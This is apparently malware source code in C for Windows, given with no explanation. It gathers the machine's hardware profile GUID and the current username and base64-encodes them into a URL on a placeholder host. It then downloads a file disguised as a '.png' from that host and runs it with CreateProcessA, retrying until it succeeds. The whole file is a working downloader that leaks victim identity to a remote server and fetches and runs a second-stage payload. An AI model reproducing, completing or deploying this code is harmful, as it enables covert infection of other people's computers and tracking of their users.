#include <Windows.h>
#include <stdio.h>
#include <string.h>

#pragma warning( disable : 4996 )
#pragma comment(lib, "Urlmon.lib")

#define INFO_BUFF_SIZE 32767

char base64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";


char* encode_data(char* data);
void b64encode(unsigned __int8* src, char* dest, int count3);
BOOL download(char* data);

int main(void)
{
    char hwProfile[20] = { '\0' };
    DWORD buff = INFO_BUFF_SIZE;
    char username[INFO_BUFF_SIZE] = { '\0' };
    char collected_data[200] = { '\0' };
	HW_PROFILE_INFOA hw_profile_info = { 0 };
	
    
    GetCurrentHwProfileA(&hw_profile_info);
    sprintf(
        hwProfile,
		"%c%c:%c%c:%c%c:%c%c:%c%c:%c%c",
        hw_profile_info.szHwProfileGuid[0x19],
        hw_profile_info.szHwProfileGuid[0x1A],
        hw_profile_info.szHwProfileGuid[0x1B],
        hw_profile_info.szHwProfileGuid[0x1C],
        hw_profile_info.szHwProfileGuid[0x1D],
        hw_profile_info.szHwProfileGuid[0x1E],
        hw_profile_info.szHwProfileGuid[0x1F],
        hw_profile_info.szHwProfileGuid[0x20],
        hw_profile_info.szHwProfileGuid[0x21],
        hw_profile_info.szHwProfileGuid[0x22],
        hw_profile_info.szHwProfileGuid[0x23],
        hw_profile_info.szHwProfileGuid[0x24]
    );

    if (!GetUserNameA(username, &buff))
        return 1;

    sprintf(collected_data, "%s-%s", hwProfile, username);
    printf_s("Text: %s\n", collected_data);
    char* encoded_data = encode_data(collected_data);
    printf_s("Encoded: %s\n", encoded_data);

    while (!download(encoded_data))
        Sleep(1);

	return 0;
}


void __cdecl b64encode(unsigned char* src, char* dest, int count3)
{
    dest[0] = base64[(src[0] >> 2) & 0x3F];
    dest[1] = base64[((src[0] & 0x03) << 4) | ((src[1] >> 4) & 0x0F)];
    if (count3 > 1)
        dest[2] = base64[((src[1] & 0x0F) << 2) | ((src[2] >> 6) & 0x03)];
    else
        dest[2] = '=';
    if (count3 > 2)
        dest[3] = base64[src[2] & 0x3F];
    else
        dest[3] = '=';
}


char* __cdecl encode_data(char* data)
{
    int length = strlen(data);
    int encoded_length = 4 * ((length + 2) / 3);
    char* encoded_data = (char*)malloc(encoded_length + 1);

    int count1 = 0;
    int count2 = 0;

    while (count1 < length)
    {
        unsigned char src[3] = { 0, 0, 0 };
        char dest[4] = { 0, 0, 0, 0 };

        int count3 = 0;
        for (int i = 0; i < 3 && count1 < length; ++i)
        {
            src[i] = data[count1++];
            count3++;
        }

        b64encode(src, dest, count3);

        for (int j = 0; j < 4; ++j) 
        {
            encoded_data[count2++] = dest[j];
        }
    }

    encoded_data[count2] = '\0';
    return encoded_data;
}


BOOL __cdecl download(char* data)
{
    size_t length = 0;
    char filename; 
    CHAR url[512];
    CHAR ApplicationName[512];
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    length = strlen(data);
    filename = data[length - 1];
    sprintf(url, "http://<URI>/%s/%c.png", data, filename);
    if (URLDownloadToCacheFileA(NULL, url, ApplicationName, 512, 0, NULL))
        return 0;
    memset(&si, 0, sizeof(si));
    si.cb = 68;
    memset(&pi, 0, sizeof(pi));
    return CreateProcessA(ApplicationName, 0, 0, 0, 0, 0, 0, 0, &si, &pi);
}
